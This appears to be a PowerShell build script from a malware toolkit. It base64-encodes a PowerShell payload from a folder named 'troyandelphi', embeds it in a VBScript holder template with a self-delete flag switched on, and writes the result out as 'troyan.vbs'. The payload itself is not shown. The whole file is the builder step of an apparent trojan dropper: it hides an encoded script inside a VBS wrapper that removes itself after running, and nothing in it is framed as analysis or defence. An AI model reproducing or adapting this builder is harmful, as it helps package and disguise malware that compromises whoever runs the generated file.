param (
    [string]$serverName
)
if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../../sys/current.ps1") -serverName $serverName

function Encode-FileToBase64 {
    param (
        [string]$inFile
    )
    if (-Not (Test-Path -Path $inFile)) {
        return "File $inFile not found."
    }
    $fileContent = [System.IO.File]::ReadAllBytes($inFile)
    $encodedContent = [Convert]::ToBase64String($fileContent)
    return $encodedContent
}

function Decode-Base64StringToFile {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $decodedBytes = [Convert]::FromBase64String($inContent)
    [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
}


$body = Encode-FileToBase64 -inFile (Join-Path -Path $scriptDir -ChildPath "../troyandelphi/_baza.ps1")

$holder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "holder.vbs")

$result = $holder -replace '__selfDel', 'yes'
$result = $result -replace '0102', $body

$result | Set-Content -Path (Join-Path -Path $scriptDir -ChildPath "troyan.vbs")